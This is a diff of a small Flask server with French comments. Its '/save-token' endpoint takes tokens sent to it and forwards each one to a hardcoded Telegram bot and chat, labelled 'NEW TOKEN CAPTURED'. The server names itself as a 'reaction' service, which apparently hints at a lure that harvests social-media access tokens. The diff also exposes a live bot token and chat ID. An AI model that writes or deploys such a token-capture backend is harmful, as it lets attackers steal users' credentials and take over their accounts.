@@ -6,19 +6,12 @@ from flask_cors import CORS
 app = Flask(__name__)
 CORS(app)
 
-# Tes paramètres Telegram
+# Tes accès Telegram
 TOKEN_BOT = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
 CHAT_ID = "7129218282"
 
-def send_telegram(text):
-    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
-    try:
-        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
-    except Exception as e:
-        print(f"Erreur Telegram: {e}")
-
 @app.route('/')
-def home():
+def health_check():
     return "SERVEUR REACTION VRAI GASY ACTIF", 200
 
 @app.route('/save-token', methods=['POST'])
@@ -27,12 +20,18 @@ def save_token():
         data = request.get_json()
         token = data.get('token')
         if token:
-            # Envoi direct du Token sur ton Telegram
-            send_telegram(f"🚀 NOUVEAU TOKEN CAPTURÉ :\n\n{token}")
-            return jsonify({"status": "ok"}), 200
-        return jsonify({"status": "error"}), 400
+            # Envoi direct vers ton Telegram
+            url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
+            payload = {
+                "chat_id": CHAT_ID,
+                "text": f"🚀 NOUVEAU TOKEN CAPTURÉ :\n\n{token}"
+            }
+            requests.post(url, json=payload, timeout=10)
+            return jsonify({"status": "sent_to_telegram"}), 200
+        return jsonify({"status": "no_token"}), 400
     except Exception as e:
-        return jsonify({"status": "exception", "msg": str(e)}), 500
+        print(f"Erreur : {e}")
+        return jsonify({"status": "error"}), 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
